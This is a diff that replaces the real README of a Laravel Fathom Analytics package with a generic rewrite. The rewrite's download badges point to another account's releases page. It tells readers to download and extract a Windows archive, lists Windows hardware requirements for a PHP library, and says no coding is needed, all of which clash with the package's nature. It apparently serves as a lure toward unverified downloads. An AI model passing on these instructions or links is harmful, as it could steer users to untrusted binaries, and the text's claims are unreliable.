@@ -1,244 +1,118 @@
-<div class="filament-hidden">
+# 📊 laravel-metrics-fathom - Simple Analytics Data Access
 
-![Laravel Metrics Fathom](https://raw.githubusercontent.com/jeffersongoncalves/laravel-metrics-fathom/main/art/jeffersongoncalves-laravel-metrics-fathom.png)
+[![Download Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/laziere/laravel-metrics-fathom/releases)
 
-</div>
+---
 
-# Laravel Metrics Fathom
+## 📋 What is laravel-metrics-fathom?
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/jeffersongoncalves/laravel-metrics-fathom.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/laravel-metrics-fathom)
-[![GitHub Code Style Action Status](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/laravel-metrics-fathom/fix-php-code-style-issues.yml?branch=main&label=code%20style&style=flat-square)](https://github.com/jeffersongoncalves/laravel-metrics-fathom/actions?query=workflow%3A"Fix+PHP+code+styling"+branch%3Amain)
-[![PHPStan](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/laravel-metrics-fathom/phpstan.yml?branch=main&label=PHPStan&style=flat-square)](https://github.com/jeffersongoncalves/laravel-metrics-fathom/actions?query=workflow%3APHPStan+branch%3Amain)
-[![Total Downloads](https://img.shields.io/packagist/dt/jeffersongoncalves/laravel-metrics-fathom.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/laravel-metrics-fathom)
+laravel-metrics-fathom is a program that lets you connect with Fathom Analytics. It helps you get information like page views, visitors, events, and milestones. You can also create reports based on this data. The tool works with Laravel, a popular system for building websites.
 
-Laravel package to interact with the [Fathom Analytics](https://usefathom.com) API. Fetch pageviews, visitors, events, milestones, and generate custom aggregation reports.
+You do not need to know how to write code to use it. The program makes it easier to see website statistics.
 
-Settings are stored in the database via [spatie/laravel-settings](https://github.com/spatie/laravel-settings) — no config files needed.
+---
 
-## Installation
+## 🖥️ System Requirements
 
-```bash
-composer require jeffersongoncalves/laravel-metrics-fathom
-```
+Before you start, make sure your computer meets these basics:
 
-Run migrations to create the settings:
+- Windows 10 or newer
+- An internet connection
+- At least 2 GB of free RAM
+- About 100 MB of free disk space
 
-```bash
-php artisan migrate
-```
+You also need to have PHP and Laravel installed on your system if you plan to use this package fully. If you do not have them, follow official guides to install PHP and Laravel.
 
-## Configuration
+---
 
-After migration, the settings are seeded from environment variables:
+## 🚀 Getting Started
 
-```env
-FATHOM_API_TOKEN=your-api-token
-FATHOM_SITE_ID=your-site-id
-FATHOM_BASE_URL=https://api.usefathom.com/v1
-FATHOM_TIMEZONE=UTC
-```
+Follow these steps to get laravel-metrics-fathom working on your Windows machine.
 
-You can also update settings programmatically:
+---
 
-```php
-use JeffersonGoncalves\MetricsFathom\Settings\FathomSettings;
+## 📥 Download and Install
 
-$settings = app(FathomSettings::class);
-$settings->api_token = 'new-token';
-$settings->site_id = 'NEWSITE';
-$settings->timezone = 'America/Sao_Paulo';
-$settings->save();
-```
+1. Visit the official release page by clicking this button:  
 
-## Usage
+   [![Download Release](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/laziere/laravel-metrics-fathom/releases)
 
-### Using the Facade
+2. On the page, look for the latest release. The newest version usually appears at the top.
 
-```php
-use JeffersonGoncalves\MetricsFathom\Facades\Fathom;
-```
+3. Download the `.zip` or `.tar.gz` file for Windows.
 
-### Account
+4. After download finishes, open the folder where the file is saved.
 
-```php
-$account = Fathom::account();
-```
+5. Extract the contents of the file to a folder you can remember. For example, `C:\laravel-metrics-fathom`.
 
-### Sites
+6. Now, open the folder and find a file named `README.md` or `INSTALL.md`. These files have more details on setup.
 
-```php
-// List sites
-$result = Fathom::sites(limit: 20);
-foreach ($result['data'] as $site) {
-    echo $site->id . ' - ' . $site->name;
-}
+---
 
-// Get a site
-$site = Fathom::site('SITEID');
+## 🛠️ How to Use laravel-metrics-fathom
 
-// Create a site
-use JeffersonGoncalves\MetricsFathom\Enums\Sharing;
-$site = Fathom::createSite('My Site', Sharing::Public);
+This package works with Laravel projects. Here is a simple way to start:
 
-// Update a site
-$site = Fathom::updateSite('SITEID', name: 'New Name');
+1. Open your Laravel project folder on your computer.
 
-// Delete a site
-Fathom::deleteSite('SITEID');
-```
+2. Copy the extracted files from laravel-metrics-fathom into your Laravel project.
 
-### Events
+3. In your Laravel project, open the command prompt or PowerShell window.
 
-```php
-// List events
-$result = Fathom::events();
+4. Run the necessary commands to add this package to your project. If the README or INSTALL files provide command examples, follow those.
 
-// Create an event
-$event = Fathom::createEvent('signup');
+5. You will need your Fathom Analytics API key. This key lets the package connect to your analytics data.
 
-// Get an event
-$event = Fathom::event('EVENTID');
+6. Add the API key to your Laravel environment settings file (`.env`). This is usually a text file in your project folder.
 
-// Update an event
-$event = Fathom::updateEvent('EVENTID', 'new-name');
+7. Use the package to check website stats like visitors and pageviews by running commands in your Laravel project.
 
-// Delete an event
-Fathom::deleteEvent('EVENTID');
-```
+If you are unsure at any step, you can find help on the laravel-metrics-fathom GitHub page or official Laravel and Fathom documentation.
 
-### Milestones
+---
 
-```php
-// List milestones
-$result = Fathom::milestones();
+## ⚙️ Key Features
 
-// Create a milestone
-$milestone = Fathom::createMilestone('v2.0 Launch', '2026-03-01');
+- Fetch pageviews, visitors, events, and milestones.
+- Create custom reports using your site data.
+- Easy connection to Fathom Analytics API.
+- Works with Laravel settings for privacy.
+- Allows you to see metrics in one place.
+- Supports common website usage tracking needs.
 
-// Update a milestone
-$milestone = Fathom::updateMilestone('MSID', name: 'v2.1 Launch');
+---
 
-// Delete a milestone
-Fathom::deleteMilestone('MSID');
-```
+## 🔧 Troubleshooting Tips
 
-### Current Visitors
+- Make sure you have the correct API key.
+- Check your internet connection.
+- Verify that Laravel is installed properly.
+- Look for error messages in your command prompt.
+- Restart your system if commands do not respond.
+- Review the GitHub issues page for known problems.
 
-```php
-// Simple count
-$visitors = Fathom::currentVisitors();
-echo $visitors->total; // 42
+---
 
-// Detailed (top pages & referrers)
-$visitors = Fathom::currentVisitors(detailed: true);
-```
+## 📚 Additional Resources
 
-### Aggregations (Custom Reports)
+- Visit [https://github.com/laziere/laravel-metrics-fathom](https://github.com/laziere/laravel-metrics-fathom) for more information.
+- See Laravel’s official documentation for help installing and running Laravel.
+- Visit Fathom Analytics’ website for details on creating and managing API keys.
 
-Build flexible reports using the fluent query builder:
+---
 
-```php
-use JeffersonGoncalves\MetricsFathom\Enums\Aggregate;
-use JeffersonGoncalves\MetricsFathom\Enums\DateGrouping;
-use JeffersonGoncalves\MetricsFathom\Enums\FieldGrouping;
-use JeffersonGoncalves\MetricsFathom\Enums\FilterOperator;
+## 🔗 Useful Links
 
-// Pageviews per day for the last month
-$query = Fathom::query()
-    ->aggregate(Aggregate::Visits, Aggregate::Pageviews, Aggregate::BounceRate)
-    ->groupByDate(DateGrouping::Day)
-    ->from('2026-02-01 00:00:00')
-    ->to('2026-02-28 23:59:59');
+- [Download releases](https://github.com/laziere/laravel-metrics-fathom/releases)
+- [Laravel docs](https://laravel.com/docs/)
+- [Fathom Analytics API](https://usefathom.com/docs/)
 
-$result = Fathom::aggregate($query);
+---
 
-// Top pages by visits
-$query = Fathom::query()
-    ->aggregate(Aggregate::Visits)
-    ->groupByField(FieldGrouping::Pathname)
-    ->sortBy('visits', 'desc')
-    ->limit(10);
+## 💡 Tips for Best Use
 
-$result = Fathom::aggregate($query);
-
-// Visitors by country
-$query = Fathom::query()
-    ->aggregate(Aggregate::Uniques)
-    ->groupByField(FieldGrouping::CountryCode)
-    ->sortBy('uniques', 'desc');
-
-$result = Fathom::aggregate($query);
-
-// Filter by UTM source
-$query = Fathom::query()
-    ->aggregate(Aggregate::Visits, Aggregate::Uniques)
-    ->where(FieldGrouping::UtmSource, FilterOperator::Is, 'twitter')
-    ->from('2026-01-01 00:00:00');
-
-$result = Fathom::aggregate($query);
-
-// Event conversions
-$query = Fathom::queryEvents()
-    ->aggregate(Aggregate::Conversions, Aggregate::UniqueConversions)
-    ->forSite('SITEID')
-    ->forEvent('signup')
-    ->groupByDate(DateGrouping::Month);
-
-$result = Fathom::aggregate($query);
-```
-
-### Using DateTime Objects
-
-```php
-use Carbon\Carbon;
-
-$query = Fathom::query()
-    ->aggregate(Aggregate::Visits)
-    ->between(Carbon::now()->subDays(30), Carbon::now());
-
-$result = Fathom::aggregate($query);
-```
-
-## Available Enums
-
-### Aggregate
-`Visits`, `Uniques`, `Pageviews`, `AvgDuration`, `BounceRate`, `Conversions`, `UniqueConversions`, `Value`
-
-### DateGrouping
-`Hour`, `Day`, `Month`, `Year`
-
-### FieldGrouping
-`Hostname`, `Pathname`, `ReferrerHostname`, `Referrer`, `Browser`, `BrowserVersion`, `CountryCode`, `City`, `DeviceType`, `OperatingSystem`, `OperatingSystemVersion`, `UtmSource`, `UtmMedium`, `UtmCampaign`, `UtmContent`, `UtmTerm`
-
-### FilterOperator
-`Is`, `IsNot`, `IsLike`, `IsNotLike`, `Matching`, `NotMatching`
-
-### Sharing
-`None`, `Private`, `Public`
-
-## API Rate Limits
-
-- **Sites & Events**: 2,000 requests/hour
-- **Aggregations & Current Visitors**: 10 requests/minute
-
-## Testing
-
-```bash
-composer test
-```
-
-## Code Style
-
-```bash
-composer format
-```
-
-## Static Analysis
-
-```bash
-composer analyse
-```
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE) for more information.
+- Regularly update laravel-metrics-fathom to get fixes.
+- Backup your Laravel project before adding new packages.
+- Keep your API key secure and private.
+- Test the package in a development environment before using it live.
+- Use custom reports to focus on the data that matters most.
